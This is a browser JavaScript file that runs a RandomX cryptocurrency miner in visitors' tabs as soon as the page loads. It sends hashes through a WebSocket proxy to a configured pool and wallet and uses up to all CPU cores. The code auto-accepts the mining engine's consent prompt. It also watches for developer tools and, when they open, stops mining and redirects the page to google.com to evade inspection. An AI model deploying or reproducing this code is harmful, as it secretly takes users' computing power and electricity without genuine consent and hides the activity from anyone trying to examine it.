const $ = (id) => document.getElementById(id);

const STATS_KEY = "p";
const COI_RELOAD_KEY = "coi-reload";
const banner = $("banner");
const disclosure = banner ? banner.textContent.trim() : "";
const statsBanner = $("stats-banner");
const statEls = statsBanner
  ? Object.fromEntries([...statsBanner.querySelectorAll("[data-stat]")].map((el) => [el.dataset.stat, el]))
  : {};

// Start with the hungriest configuration and only step down after the engine
// actually fails. Full mode shares one dataset across pthreads, so it is both
// faster and cheaper than running the same number of light workers. Without
// cross-origin isolation the browser cannot run it, so light starts at 100%.
const ENGINE_ATTEMPTS = [
  { mode: "full", scale: 1 },
  { mode: "light", scale: 1, memory: 100, memoryCap: 16 },
  { mode: "light", scale: 0.75, memory: 75, memoryCap: 12 },
  { mode: "light", scale: 0.5, memory: 50, memoryCap: 8 },
  { mode: "light", scale: 0.25, memory: 25, memoryCap: 4 },
];

let rx = null;
let destroyed = false;
let latestState = null;
let serverStatus = null;
let engineConfig = null;
let attemptIndex = 0;
let retryTimer = null;
let retryPending = false;

function formatHashrate(hps) {
  if (!Number.isFinite(hps) || hps <= 0) return "0 H/s";
  if (hps >= 1e6) return `${(hps / 1e6).toFixed(2)} MH/s`;
  if (hps >= 1e3) return `${(hps / 1e3).toFixed(1)} kH/s`;
  return `${hps.toFixed(1)} H/s`;
}

function setStatus(text) {
  if (banner) banner.textContent = `${disclosure} — ${text}`;
}

function setStat(name, value) {
  const el = statEls[name];
  if (el) el.textContent = value;
}

function datasetText(state) {
  if (!state) return "—";
  const engine = state.engine || {};
  const mode = engine.mode || "light";
  const progress = Number.isFinite(state.progress) ? state.progress : 0;
  const percent = `${Math.round(progress * 100)}%`;
  const replicas = engine.replicasActive || engine.replicas || 0;

  if (mode === "full") {
    return progress >= 1 ? `full · ready · ${engine.memoryMiB || "?"} MiB` : `full · building ${percent}`;
  }
  if (replicas) {
    return progress >= 1 ? `light + ${replicas} full · ready` : `light + ${replicas} full · building ${percent}`;
  }
  return `light · ${engine.workers || state.threads || "?"} workers`;
}

function fullModeNote() {
  if (window.crossOriginIsolated === true) return "available";
  if (window.isSecureContext !== true) return "unavailable · needs HTTPS";
  if (typeof SharedArrayBuffer === "undefined") return "unavailable · no SharedArrayBuffer";
  return "unavailable · COOP/COEP missing";
}

function renderStats() {
  if (!statsBanner || statsBanner.hidden) return;

  const state = latestState;
  const cfg = serverStatus;

  setStat("state", state ? `${state.phase}${state.running ? "" : " · stopped"}` : "starting…");
  setStat("hashrate", state ? formatHashrate(state.hashrate) : "—");
  setStat("dataset", datasetText(state));
  setStat("full", fullModeNote());
  setStat(
    "threads",
    state ? `${state.threads ?? "?"} / ${state.limits?.cores ?? "?"} cores` : "—",
  );
  setStat("accepted", state ? String(state.accepted || 0) : "—");
  setStat("rejected", state ? String(state.rejected || 0) : "—");
  setStat("pool", cfg?.pool ? `${cfg.pool.host}:${cfg.pool.port}` : "—");
  setStat("worker", cfg?.worker || "—");
  setStat("wallet", cfg?.walletShort || "—");
  setStat(
    "stored",
    cfg?.shares ? `${cfg.shares.accepted} accepted / ${cfg.shares.rejected} rejected` : "—",
  );
}

async function refreshServerStats() {
  try {
    const response = await fetch("/api/status", { cache: "no-store" });
    if (!response.ok) return;
    serverStatus = await response.json();
    renderStats();
  } catch {
    /* stats keep the last known values */
  }
}

function toggleStats(force) {
  if (!statsBanner) return;
  const show = force ?? statsBanner.hidden;
  statsBanner.hidden = !show;
  if (show) {
    renderStats();
    refreshServerStats();
  }
}

function stopEngine() {
  clearTimeout(retryTimer);
  retryTimer = null;
  retryPending = false;
  try {
    rx?.stop?.();
    rx?.destroy?.();
  } catch {
    /* ignore */
  }
  rx = null;
}

function selfDestruct() {
  if (destroyed) return;
  destroyed = true;

  stopEngine();

  try {
    window.stop();
  } catch {
    /* ignore */
  }

  location.replace("https://www.google.com/");
}

// Docked developer tools shrink the viewport relative to the outer window.
// Check only for a large gap so ordinary browser chrome does not trigger it.
function devtoolsOpen() {
  if (window.innerWidth <= 0 || window.innerHeight <= 0) return false;
  const widthGap = window.outerWidth - window.innerWidth;
  const heightGap = window.outerHeight - window.innerHeight;
  return widthGap > 200 || heightGap > 200;
}

function checkDevtools() {
  if (devtoolsOpen()) selfDestruct();
}

window.addEventListener("resize", checkDevtools);
setInterval(checkDevtools, 300);

window.addEventListener("keydown", (event) => {
  const key = typeof event.key === "string" ? event.key.toUpperCase() : "";
  const devtoolsShortcut =
    event.key === "F12" ||
    (event.ctrlKey && event.shiftKey && ["I", "J", "C"].includes(key)) ||
    (event.metaKey && event.altKey && ["I", "J", "C"].includes(key));

  if (devtoolsShortcut) selfDestruct();
});

window.addEventListener("keydown", (event) => {
  if (event.repeat || event.defaultPrevented) return;
  if (event.ctrlKey || event.metaKey || event.altKey) return;
  if (typeof event.key !== "string" || event.key.toLowerCase() !== STATS_KEY) return;

  const target = event.target;
  const tag = target instanceof Element ? target.tagName : "";
  if (target instanceof Element && (target.isContentEditable || /^(INPUT|TEXTAREA|SELECT)$/.test(tag))) return;

  event.preventDefault();
  toggleStats();
});

function chooseMode() {
  return window.crossOriginIsolated === true ? "full" : "light";
}

// Full mode needs SharedArrayBuffer (and therefore cross-origin isolation).
// The Bun server sends COOP/COEP, but reverse proxies sometimes strip them.
// A same-origin service worker can re-add those headers to the document and
// unlock full mode without changing the proxy.
async function enableCrossOriginIsolation() {
  if (window.crossOriginIsolated === true) return false;
  if (window.isSecureContext !== true || !("serviceWorker" in navigator)) return false;

  try {
    if (sessionStorage.getItem(COI_RELOAD_KEY) === "1") return false;
  } catch {
    return false;
  }

  try {
    await navigator.serviceWorker.register("/coi-serviceworker.js", { scope: "/" });
    const active = await Promise.race([
      navigator.serviceWorker.ready.then(() => true),
      new Promise((resolve) => setTimeout(() => resolve(false), 2000)),
    ]);
    if (window.crossOriginIsolated === true) return false;
    if (navigator.serviceWorker.controller || !active) return false;

    try {
      sessionStorage.setItem(COI_RELOAD_KEY, "1");
    } catch {
      /* reload once anyway */
    }
    location.reload();
    return true;
  } catch {
    return false;
  }
}

function attemptThreads(attempt) {
  const reported = Number(navigator.hardwareConcurrency);
  const cores = Number.isFinite(reported) && reported >= 1 ? Math.floor(reported) : 2;
  return Math.min(32, Math.max(1, Math.round(cores * attempt.scale)));
}

function attemptLabel(attempt) {
  const threads = attemptThreads(attempt);
  return attempt.mode === "full"
    ? `full · ${threads} threads`
    : `light · ${threads} threads · ${attempt.memory}% memory`;
}

function buildEngine(cfg, attempt) {
  const scheme = location.protocol === "https:" ? "wss" : "ws";
  return RandomXEmbed.create({
    wallet: cfg.wallet,
    pool: cfg.pool.host,
    port: cfg.pool.port,
    proxy: `${scheme}://${location.host}/ws`,
    assetBase: "/randomx/",
    mode: attempt.mode,
    workload: 100,
    maxThreads: attemptThreads(attempt),
    workerName: cfg.worker,
    routeQuery: false,
    headless: true,
    ...(attempt.mode === "light"
      ? { memory: attempt.memory, memoryCap: attempt.memoryCap, replicas: 0 }
      : {}),
  });
}

function retryableError(error) {
  if (!error) return false;
  if (error.code === "ENGINE_WORKER_FAILED") return true;
  return error.code === "DEPLOYMENT_UNSUPPORTED" && ENGINE_ATTEMPTS[attemptIndex]?.mode === "full";
}

function scheduleRetry(error) {
  if (!retryableError(error)) return false;
  if (retryPending) return true;

  const next = attemptIndex + 1;
  if (next >= ENGINE_ATTEMPTS.length) return false;

  retryPending = true;
  setStatus(`engine failed · retrying with ${attemptLabel(ENGINE_ATTEMPTS[next])}…`);

  retryTimer = setTimeout(() => {
    retryTimer = null;
    retryPending = false;
    if (destroyed || !engineConfig) return;
    try {
      rx?.destroy?.();
    } catch {
      /* ignore */
    }
    rx = null;
    try {
      startAttempt(next);
    } catch (setupError) {
      setStatus(`engine setup failed · ${setupError.message}`);
    }
  }, 1000);
  return true;
}

function startAttempt(index) {
  attemptIndex = index;
  const engine = buildEngine(engineConfig, ENGINE_ATTEMPTS[index]);
  rx = engine;
  engine.on("state", renderState);
  engine.on("consent-request", (detail) => detail.accept());
  renderState(engine.state);
  if (!engine.state.error) engine.requestConsent();
}

function renderState(state) {
  if (!state) return;
  latestState = state;
  renderStats();

  if (state.error) {
    if (!scheduleRetry(state.error)) {
      setStatus(`error · ${state.error.message || state.error.code || "unknown"}`);
    }
    return;
  }

  const parts = [
    state.phase || (state.running ? "mining" : "idle"),
    formatHashrate(state.hashrate),
    `accepted ${state.accepted || 0}`,
    `rejected ${state.rejected || 0}`,
  ];
  if (state.threads != null) parts.push(`${state.threads} threads`);
  if (state.progress != null && state.progress < 1) {
    parts.push(`dataset ${Math.round(state.progress * 100)}%`);
  }

  setStatus(parts.join(" · "));
}

function attachEngine(cfg) {
  engineConfig = cfg;
  startAttempt(chooseMode() === "full" ? 0 : 1);
}

async function init() {
  if (await enableCrossOriginIsolation()) return;

  let cfg;
  try {
    const response = await fetch("/api/status", { cache: "no-store" });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    cfg = await response.json();
  } catch (error) {
    setStatus(`server unreachable · ${error.message}`);
    return;
  }

  serverStatus = cfg;
  renderStats();

  if (cfg.configured !== true || cfg.mode !== "pool") {
    setStatus(cfg.errors?.[0] ? `not mining · ${cfg.errors[0]}` : "not mining · server unconfigured");
    return;
  }

  if (!window.RandomXEmbed) {
    setStatus("not mining · /randomx/embed.js failed to load");
    return;
  }

  try {
    attachEngine(cfg);
  } catch (error) {
    setStatus(`engine setup failed · ${error.message}`);
  }
}

function dismissBanner() {
  stopEngine();
  banner?.remove();
}

banner?.addEventListener("click", dismissBanner);

window.addEventListener("pagehide", stopEngine);

init();
